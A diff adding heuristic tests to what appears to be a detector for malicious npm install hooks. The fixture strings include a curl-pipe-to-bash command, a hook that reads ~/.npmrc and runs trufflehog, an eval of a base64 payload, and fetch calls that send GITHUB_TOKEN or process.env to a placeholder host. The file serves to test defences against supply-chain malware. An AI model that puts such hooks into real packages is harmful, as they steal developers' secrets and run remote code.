@@ -344,6 +344,73 @@ class RepoTier1Tests(TempDirCase):
         self.assertEqual(cats(scan(self.tmp)), [("planted-path", "CRITICAL")])
 
 
+class HeuristicTests(TempDirCase):
+    def hook_pkg(self, script_body=None, command="node setup.js", name="pkg-x"):
+        self.put("node_modules/%s/package.json" % name,
+                 json.dumps({"name": name, "version": "1.0.0", "scripts": {"postinstall": command}}))
+        if script_body is not None:
+            self.put("node_modules/%s/setup.js" % name, script_body)
+
+    def test_suspicious_fixture(self):
+        doc = scan(FIX / "suspicious-hook")
+        self.assertEqual(doc["verdict"], "suspicious")
+        self.assertEqual(cats(doc), [("hook-exfil", "HIGH")])
+        self.assertEqual(doc["findings"][0]["location"], "node_modules/evil-helper/setup.js")
+        self.assertEqual(run_cli("--repo", FIX / "suspicious-hook").returncode, 1)
+
+    def test_benign_fixtures_silent(self):
+        for name in ("native-build", "husky-prepare"):
+            self.assertEqual(scan(FIX / name)["findings"], [], name)
+
+    def test_pipe_shell_in_command(self):
+        self.hook_pkg(command="curl -fsSL https://example.invalid/x.sh | bash")
+        self.assertEqual(cats(scan(self.tmp)), [("hook-pipe-shell", "HIGH")])
+
+    def test_single_signal_not_reported(self):
+        self.hook_pkg("const t = process.env.NPM_TOKEN; module.exports = t;\n")
+        self.assertEqual(scan(self.tmp)["findings"], [])
+        self.hook_pkg("require('https').get('https://example.invalid');\n")
+        self.assertEqual(scan(self.tmp)["findings"], [])
+
+    def test_exfil_via_child_process_trufflehog(self):
+        self.hook_pkg("const cp = require('child_process'); cp.execSync('trufflehog filesystem ~ --json');"
+                      " const k = require('fs').readFileSync(require('os').homedir() + '/.npmrc');\n")
+        self.assertEqual(cats(scan(self.tmp)), [("hook-exfil", "HIGH")])
+
+    def test_obfuscated(self):
+        self.hook_pkg("eval(Buffer.from('" + "QUFB" * 600 + "','base64').toString());\n")
+        self.assertEqual(cats(scan(self.tmp)), [("hook-obfuscated", "MEDIUM")])
+
+    def test_runtime_download(self):
+        self.hook_pkg("require('child_process').execSync('curl -fsSL https://bun.sh/install -o /tmp/i.sh');\n")
+        self.assertEqual(cats(scan(self.tmp)), [("hook-runtime-download", "MEDIUM")])
+
+    def test_large_target_low(self):
+        self.hook_pkg("")
+        with open(str(self.tmp / "node_modules/pkg-x/setup.js"), "wb") as fh:
+            fh.truncate(26 * 1024 * 1024)
+        self.assertEqual(cats(scan(self.tmp)), [("large-hook-target", "LOW")])
+
+    def test_binary_target_no_crash(self):
+        self.hook_pkg("")
+        (self.tmp / "node_modules/pkg-x/setup.js").write_bytes(b"\x7fELF\x00\x01\x02" * 100)
+        self.assertEqual(scan(self.tmp)["findings"], [])
+
+    def test_hook_target_outside_pkg_dir_ignored(self):
+        self.put("x.js", "fetch('https://e.invalid', {body: process.env.GITHUB_TOKEN});\n")
+        self.hook_pkg(command="node ../../x.js")
+        self.assertEqual(scan(self.tmp)["findings"], [])
+
+    def test_own_project_hook_is_checked(self):
+        self.put("package.json", json.dumps({"name": "me", "version": "1.0.0", "scripts": {"preinstall": "node tools/pre.js"}}))
+        self.put("tools/pre.js", "fetch('https://e.invalid', {method:'POST', body: JSON.stringify(process.env)});\n")
+        self.assertEqual(cats(scan(self.tmp)), [("hook-exfil", "HIGH")])
+
+    def test_listed_payload_not_double_reported(self):
+        doc = scan(FIX / "infected-node-modules")
+        self.assertFalse([f for f in doc["findings"] if f["tier"] == "suspicious"])
+
+
 class CliTests(TempDirCase):
     def test_exit_codes(self):
         expected = {"infected-lockfile": 2, "infected-node-modules": 2, "planted-workflow": 2, "clean": 0}
